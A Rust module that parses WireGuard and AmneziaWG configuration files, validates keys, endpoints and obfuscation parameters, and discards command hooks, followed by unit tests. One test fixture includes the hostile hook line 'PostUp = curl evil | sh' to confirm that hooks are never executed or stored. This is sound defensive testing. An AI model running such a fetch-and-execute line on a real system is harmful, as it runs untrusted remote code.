//! WireGuard / AmneziaWG `.conf` (INI) parsing.

use crate::validate as v;
use core_model::{ConfigIssue, Profile, Protocol, Secret};
use std::collections::BTreeMap;

const WG: &str = "WireGuard";
pub fn looks_like(text: &str) -> bool {
    text.lines()
        .any(|l| l.trim().eq_ignore_ascii_case("[interface]"))
}

#[derive(Default)]
struct Section {
    kv: BTreeMap<String, String>,
}

fn sections(text: &str) -> Result<(Section, Vec<Section>), ConfigIssue> {
    let mut iface: Option<Section> = None;
    let mut peers: Vec<Section> = Vec::new();
    let mut cur: Option<(bool, Section)> = None; // (is_interface, section)
    let flush = |cur: &mut Option<(bool, Section)>,
                 iface: &mut Option<Section>,
                 peers: &mut Vec<Section>| {
        if let Some((is_if, s)) = cur.take() {
            if is_if {
                *iface = Some(s);
            } else {
                peers.push(s);
            }
        }
    };
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            flush(&mut cur, &mut iface, &mut peers);
            match line[1..line.len() - 1].trim().to_ascii_lowercase().as_str() {
                "interface" => cur = Some((true, Section::default())),
                "peer" => cur = Some((false, Section::default())),
                _ => {
                    return Err(ConfigIssue::InvalidField {
                        protocol: WG,
                        field: "section",
                    })
                }
            }
            continue;
        }
        let Some((_, sec)) = cur.as_mut() else {
            return Err(ConfigIssue::Unrecognized);
        };
        let Some((k, v)) = line.split_once('=') else {
            return Err(ConfigIssue::InvalidField {
                protocol: WG,
                field: "line",
            });
        };
        let k = k.trim().to_ascii_lowercase();
        let val = v.trim().to_string();
        match sec.kv.get_mut(&k) {
            // wg-quick allows Address, DNS and AllowedIPs to repeat; they accumulate.
            Some(old)
                if matches!(
                    k.as_str(),
                    "address" | "dns" | "allowedips" | "preup" | "postup" | "predown" | "postdown"
                ) =>
            {
                old.push_str(", ");
                old.push_str(&val);
            }
            Some(_) => {
                return Err(ConfigIssue::InvalidField {
                    protocol: WG,
                    field: "duplicate key",
                })
            }
            None => {
                sec.kv.insert(k, val);
            }
        }
    }
    flush(&mut cur, &mut iface, &mut peers);
    Ok((
        iface.ok_or(ConfigIssue::MissingField {
            protocol: WG,
            field: "Interface",
        })?,
        peers,
    ))
}

/// Split `host:port`, `[v6]:port`.
fn split_endpoint(ep: &str) -> Option<(String, u16)> {
    let (host, port) = ep.trim().rsplit_once(':')?;
    Some((v::host(host)?, v::port(port)?))
}

/// AmneziaWG parameters and the engine (UAPI) names they map to. Keys are matched
/// case-insensitively, as `wg-quick` does.
const AWG_MAP: &[(&str, &str)] = &[
    ("jc", "jc"),
    ("jmin", "jmin"),
    ("jmax", "jmax"),
    ("s1", "s1"),
    ("s2", "s2"),
    ("s3", "s3"),
    ("s4", "s4"),
    ("h1", "h1"),
    ("h2", "h2"),
    ("h3", "h3"),
    ("h4", "h4"),
    ("i1", "i1"),
    ("i2", "i2"),
    ("i3", "i3"),
    ("i4", "i4"),
    ("i5", "i5"),
    ("j1", "j1"),
    ("j2", "j2"),
    ("j3", "j3"),
    ("itime", "itime"),
    ("headerprotectionkey", "header_protection_key"),
    ("contentpaddingaddition", "content_padding_addition"),
    ("rekeyaftertime", "rekey_after_time"),
    ("rekeytimeout", "rekey_timeout"),
    ("rejectaftertime", "reject_after_time"),
    ("keepalivetimeout", "keepalive_timeout"),
    ("maxhandshakeattempts", "max_handshake_attempts"),
    ("randomtrailers", "random_trailers"),
    ("disablecookies", "disable_cookies"),
];
/// Directives that run commands or change host state; dropped (never executed) like OpenVPN scripts.
const HOOKS: &[&str] = &[
    "preup",
    "postup",
    "predown",
    "postdown",
    "saveconfig",
    "table",
    "fwmark",
    "listenport",
];
fn bad(field: &'static str) -> ConfigIssue {
    ConfigIssue::InvalidField {
        protocol: WG,
        field,
    }
}

fn uint(s: &str) -> Option<u32> {
    s.trim().parse::<u32>().ok()
}

/// `n` or `lo-hi` (both u32, lo <= hi).
fn range(s: &str) -> Option<(u32, u32)> {
    match s.trim().split_once('-') {
        Some((a, b)) => {
            let (a, b) = (uint(a)?, uint(b)?);
            (a <= b).then_some((a, b))
        }
        None => uint(s).map(|n| (n, n)),
    }
}

/// I1..I5 chains: `<b 0x..><r 16><t><c>...`; only the tag kinds the engine knows, nothing else.
fn obf_chain_ok(s: &str) -> bool {
    let mut rest = s.trim();
    if rest.is_empty() {
        return false;
    }
    while !rest.is_empty() {
        let Some(r) = rest.strip_prefix('<') else {
            return false;
        };
        let Some(end) = r.find('>') else { return false };
        let mut it = r[..end].split_whitespace();
        let tag = it.next().unwrap_or("");
        let arg = it.next();
        if it.next().is_some()
            || !matches!(tag, "b" | "t" | "r" | "rc" | "rd" | "d" | "ds" | "dz")
            || arg.is_some_and(|a| !a.bytes().all(|c| c.is_ascii_alphanumeric()))
        {
            return false;
        }
        rest = &r[end + 1..];
    }
    true
}

/// Validate AmneziaWG values the way the engine does and return the `awg_*` settings.
fn awg_settings(iface: &Section) -> Result<BTreeMap<String, String>, ConfigIssue> {
    let mut out = BTreeMap::new();
    for (src, dst) in AWG_MAP {
        let Some(val) = iface.kv.get(*src) else {
            continue;
        };
        let ok = match *dst {
            "jc" | "jmin" | "jmax" => uint(val).is_some_and(|n| n <= 1280),
            "s1" | "s2" | "s3" | "s4" => uint(val).is_some_and(|n| n <= 1280),
            "h1" | "h2" | "h3" | "h4" => range(val).is_some(),
            "i1" | "i2" | "i3" | "i4" | "i5" | "j1" | "j2" | "j3" => obf_chain_ok(val),
            "itime" => uint(val).is_some(),
            "header_protection_key" => {
                val.len() == 64 && val.bytes().all(|c| c.is_ascii_hexdigit())
            }
            "random_trailers" | "disable_cookies" => matches!(
                val.to_ascii_lowercase().as_str(),
                "true" | "false" | "1" | "0"
            ),
            _ => range(val).is_some(),
        };
        if !ok {
            return Err(bad("AmneziaWG parameter"));
        }
        out.insert(format!("awg_{dst}"), val.trim().to_string());
    }
    let n = |k: &str| out.get(k).and_then(|v| uint(v));
    if let (Some(lo), Some(hi)) = (n("awg_jmin"), n("awg_jmax")) {
        if lo > hi {
            return Err(bad("Jmin greater than Jmax"));
        }
    }
    if let (Some(s1), Some(s2)) = (n("awg_s1"), n("awg_s2")) {
        // init (148+S1) and response (92+S2) packets would have the same size.
        if s1 + 56 == s2 {
            return Err(bad("S1/S2 give equal packet sizes"));
        }
    }
    let hs: Vec<(u32, u32)> = ["awg_h1", "awg_h2", "awg_h3", "awg_h4"]
        .iter()
        .filter_map(|k| out.get(*k).and_then(|v| range(v)))
        .collect();
    for i in 0..hs.len() {
        for j in i + 1..hs.len() {
            if hs[i].0 <= hs[j].1 && hs[j].0 <= hs[i].1 {
                return Err(bad("H1-H4 must not overlap"));
            }
        }
    }
    Ok(out)
}

pub fn parse(text: &str) -> Result<Profile, ConfigIssue> {
    let (iface, peers) = sections(text)?;
    if peers.len() > 1 {
        return Err(ConfigIssue::Unsupported(
            "WireGuard config with several peers",
        ));
    }
    let peer = peers.first().ok_or(ConfigIssue::MissingField {
        protocol: WG,
        field: "Peer",
    })?;
    let private = iface
        .kv
        .get("privatekey")
        .ok_or(ConfigIssue::MissingField {
            protocol: WG,
            field: "PrivateKey",
        })?;
    let private = v::key32(private).ok_or(bad("PrivateKey"))?;
    let public = peer.kv.get("publickey").ok_or(ConfigIssue::MissingField {
        protocol: WG,
        field: "PublicKey",
    })?;
    let public = v::key32(public).ok_or(bad("PublicKey"))?;
    let endpoint = peer.kv.get("endpoint").ok_or(ConfigIssue::MissingField {
        protocol: WG,
        field: "Endpoint",
    })?;
    let (host, port) = split_endpoint(endpoint).ok_or(bad("Endpoint"))?;
    let allowed = peer.kv.get("allowedips").ok_or(ConfigIssue::MissingField {
        protocol: WG,
        field: "AllowedIPs",
    })?;
    let allowed: Option<Vec<String>> = allowed.split(',').map(v::cidr).collect();
    let allowed = allowed.ok_or(bad("AllowedIPs"))?;
    let address = iface.kv.get("address").ok_or(ConfigIssue::MissingField {
        protocol: WG,
        field: "Address",
    })?;
    let address: Option<Vec<String>> = address.split(',').map(v::cidr).collect();
    let address = address.ok_or(bad("Address"))?;

    let mut settings = BTreeMap::new();
    settings.insert("address".into(), address.join(", "));
    settings.insert("allowed_ips".into(), allowed.join(", "));
    settings.insert("peer_public_key".into(), public);
    if let Some(d) = iface.kv.get("dns") {
        // Addresses plus optional search domains (wg-quick passes both to resolvconf); each entry is
        // validated and the engine side splits them again.
        let items: Option<Vec<String>> = d
            .split(',')
            .map(str::trim)
            .filter(|x| !x.is_empty())
            .map(v::host)
            .collect();
        let items = items.ok_or(bad("DNS"))?;
        if !items.is_empty() {
            settings.insert("dns".into(), items.join(", "));
        }
    }
    if let Some(m) = iface.kv.get("mtu") {
        let n: u16 = m.trim().parse().map_err(|_| bad("MTU"))?;
        if !(576..=9000).contains(&n) {
            return Err(bad("MTU"));
        }
        settings.insert("mtu".into(), n.to_string());
    }
    if let Some(k) = peer.kv.get("persistentkeepalive") {
        let k = k.trim();
        let n: u16 = if k.eq_ignore_ascii_case("off") {
            0
        } else {
            k.parse().map_err(|_| bad("PersistentKeepalive"))?
        };
        settings.insert("persistent_keepalive".into(), n.to_string());
    }
    if let Some(r) = peer.kv.get("reserved") {
        // Cloudflare WARP style extension used by several clients.
        let nums: Option<Vec<u8>> = r.split(',').map(|x| x.trim().parse().ok()).collect();
        match nums {
            Some(n) if n.len() == 3 => {
                settings.insert("reserved".into(), format!("{},{},{}", n[0], n[1], n[2]));
            }
            _ => return Err(bad("Reserved")),
        }
    }
    if HOOKS
        .iter()
        .any(|h| *h != "listenport" && iface.kv.contains_key(*h))
    {
        // Commands are never run; the app sets up routes and DNS itself.
        settings.insert("warnings".into(), "hooks_ignored".into());
    }
    let mut secrets = BTreeMap::new();
    secrets.insert("private_key".into(), Secret::new(private));
    if let Some(psk) = peer.kv.get("presharedkey") {
        secrets.insert(
            "preshared_key".into(),
            Secret::new(v::key32(psk).ok_or(bad("PresharedKey"))?),
        );
    }
    let awg = awg_settings(&iface)?;
    let protocol = if awg.is_empty() {
        Protocol::WireGuard
    } else {
        Protocol::AmneziaWg
    };
    settings.extend(awg);
    Ok(Profile {
        name: host.clone(),
        protocol,
        host,
        port,
        settings,
        secrets,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    // 32 zero bytes, base64
    const K: &str = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
    fn conf(extra_if: &str) -> String {
        format!("[Interface]\nPrivateKey = {K}\nAddress = 10.0.0.2/32\nDNS = 1.1.1.1\n{extra_if}\n[Peer]\nPublicKey = {K}\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0, ::/0\n")
    }

    #[test]
    fn parses_plain_wireguard() {
        let p = parse(&conf("")).unwrap();
        assert_eq!(p.protocol, Protocol::WireGuard);
        assert_eq!((p.host.as_str(), p.port), ("vpn.example.com", 51820));
        assert!(p.secrets.contains_key("private_key"));
        // The public key is a plain setting; only the secrets map must be redacted.
        let dbg = format!("{:?}", p.secrets);
        assert!(dbg.contains("<redacted>") && !dbg.contains(K));
    }

    #[test]
    fn detects_amnezia_by_obfuscation_keys() {
        let p = parse(&conf("Jc = 5\nS1 = 20\nH1 = 123")).unwrap();
        assert_eq!(p.protocol, Protocol::AmneziaWg);
        assert_eq!(p.settings.get("awg_jc").map(String::as_str), Some("5"));
    }

    #[test]
    fn rejects_bad_key_missing_peer_and_bad_port() {
        let bad = conf("").replace(&format!("PrivateKey = {K}"), "PrivateKey = short");
        assert_eq!(
            parse(&bad),
            Err(ConfigIssue::InvalidField {
                protocol: WG,
                field: "PrivateKey"
            })
        );
        assert_eq!(
            parse(&format!(
                "[Interface]\nPrivateKey = {K}\nAddress = 10.0.0.2/32\n"
            )),
            Err(ConfigIssue::MissingField {
                protocol: WG,
                field: "Peer"
            })
        );
        let badport = conf("").replace(":51820", ":99999");
        assert_eq!(
            parse(&badport),
            Err(ConfigIssue::InvalidField {
                protocol: WG,
                field: "Endpoint"
            })
        );
    }

    #[test]
    fn hooks_are_never_kept_and_multiple_addresses_accumulate() {
        let c = format!("[Interface]\nPrivateKey = {K}\nAddress = 10.0.0.2/32\nAddress = fd00::2/128\nDNS = 1.1.1.1, example.com\nDNS = 2606:4700::1111\nPostUp = curl evil | sh\nPostUp = id\nPreDown = x\nTable = off\nSaveConfig = true\nFwMark = 5\n[Peer]\nPublicKey = {{K}}\nEndpoint = [2001:db8::1]:51820 # note\nAllowedIPs = 0.0.0.0/0\nAllowedIPs = ::/0\n").replace("{K}", K);
        let p = parse(&c).unwrap();
        assert_eq!(p.settings["address"], "10.0.0.2/32, fd00::2/128");
        assert_eq!(p.settings["dns"], "1.1.1.1, example.com, 2606:4700::1111");
        assert_eq!(p.settings["allowed_ips"], "0.0.0.0/0, ::/0");
        assert_eq!(p.settings["warnings"], "hooks_ignored");
        assert_eq!(p.host, "2001:db8::1");
        assert!(!format!("{:?}{:?}", p.settings, p.secrets).contains("curl"));
    }

    #[test]
    fn several_peers_are_rejected_explicitly() {
        let c = format!(
            "{}[Peer]\nPublicKey = {K}\nEndpoint = b.example.com:1\nAllowedIPs = 10.9.0.0/24\n",
            conf("")
        );
        assert!(matches!(parse(&c), Err(ConfigIssue::Unsupported(_))));
    }

    #[test]
    fn case_insensitive_crlf_and_validation() {
        let c = conf("")
            .replace('\n', "\r\n")
            .replace("PrivateKey", "privatekey")
            .replace("[Peer]", "[PEER]");
        assert!(parse(&c).is_ok());
        for (from, to) in [
            ("Address = 10.0.0.2/32", "Address = 10.0.0.2/40"),
            ("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = nope"),
            ("vpn.example.com", "bad host.com"),
            ("DNS = 1.1.1.1", "MTU = 20"),
        ] {
            assert!(parse(&conf("").replace(from, to)).is_err(), "{from}");
        }
    }

    #[test]
    fn amneziawg_full_parameter_set_and_validation() {
        let full = "Jc = 5\nJmin = 10\nJmax = 50\nS1 = 20\nS2 = 30\nS3 = 15\nS4 = 8\nH1 = 100-200\nH2 = 300-400\nH3 = 500\nH4 = 600-700\nI1 = <b 0xf6ab3267fa><t><r 10>\nHeaderProtectionKey = 0000000000000000000000000000000000000000000000000000000000000001\nContentPaddingAddition = 0-16\nRekeyAfterTime = 120-180\nRandomTrailers = true\nDisableCookies = false";
        let p = parse(&conf(full)).unwrap();
        assert_eq!(p.protocol, Protocol::AmneziaWg);
        for k in [
            "awg_s3",
            "awg_i1",
            "awg_h1",
            "awg_header_protection_key",
            "awg_content_padding_addition",
            "awg_rekey_after_time",
            "awg_random_trailers",
            "awg_disable_cookies",
        ] {
            assert!(p.settings.contains_key(k), "{k}");
        }
        // only I1 present is still AmneziaWG
        assert_eq!(
            parse(&conf("I1 = <r 5>")).unwrap().protocol,
            Protocol::AmneziaWg
        );
        for bad in [
            "Jmin = 60\nJmax = 50",
            "S1 = 20\nS2 = 76",
            "H1 = 5\nH2 = 5",
            "H1 = 10-20\nH2 = 15-30",
            "I1 = <evil 5>",
            "I1 = junk",
            "Jc = -1",
            "HeaderProtectionKey = zz",
            "H1 = 20-10",
            "J1 = junk",
            "ITime = x",
            "I2 = <b 0x00><c>",
        ] {
            assert!(parse(&conf(bad)).is_err(), "{bad}");
        }
    }

    #[test]
    fn realistic_awg_1_0_1_5_and_2_0_configs() {
        let awg1 = "Jc = 4\nJmin = 40\nJmax = 70\nS1 = 0\nS2 = 0\nH1 = 1\nH2 = 2\nH3 = 3\nH4 = 4";
        let p = parse(&conf(awg1)).unwrap();
        assert_eq!(p.protocol, Protocol::AmneziaWg);
        assert_eq!(p.settings["awg_h4"], "4");
        let awg15 = format!("{awg1}\nI1 = <b 0xc7000000011419a9><r 16><t>\nI2 = <r 32>\nI3 = <rc 8><rd 4>\nJ1 = <r 12>\nITime = 120");
        let p = parse(&conf(&awg15)).unwrap();
        for k in ["awg_i1", "awg_i2", "awg_i3", "awg_j1", "awg_itime"] {
            assert!(p.settings.contains_key(k), "{k}");
        }
        let awg2 = "Jc = 7\nJmin = 50\nJmax = 1000\nS1 = 68\nS2 = 149\nS3 = 32\nS4 = 16\nH1 = 5-2147483647\nH2 = 2147483648-3000000000\nH3 = 3000000001-3500000000\nH4 = 3500000001-4294967295\nI1 = <b 0xdeadbeef><r 16><t>";
        let p = parse(&conf(awg2)).unwrap();
        assert_eq!(p.settings["awg_h1"], "5-2147483647");
        assert_eq!(p.settings["awg_h4"], "3500000001-4294967295");
        assert_eq!(p.settings["awg_s4"], "16");
        assert!(parse(&conf("H1 = 4294967296")).is_err());
    }

    #[test]
    fn ipv6_endpoint() {
        assert_eq!(
            split_endpoint("[2001:db8::1]:51820"),
            Some(("2001:db8::1".into(), 51820))
        );
    }
}
